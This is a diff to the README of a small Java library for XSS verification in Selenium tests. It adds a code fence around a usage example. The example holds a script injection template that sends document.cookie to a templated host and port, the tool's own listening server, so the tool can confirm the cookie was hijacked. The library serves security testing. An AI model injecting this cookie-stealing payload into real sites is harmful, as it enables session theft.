@@ -8,7 +8,7 @@ A little project for XSS-safe verification for Selenium
         </dependency>
 
 Usage example:
-
+```java
 XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
 /* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/
 
@@ -41,3 +41,4 @@ while (!x.getXSSCookieHijacked("visited"))
 
 //the XSS host and resource were requested, some parameter was passed and this parameter is cookie named visited
 //so the particular cookie was hijacked and that was verified
+```
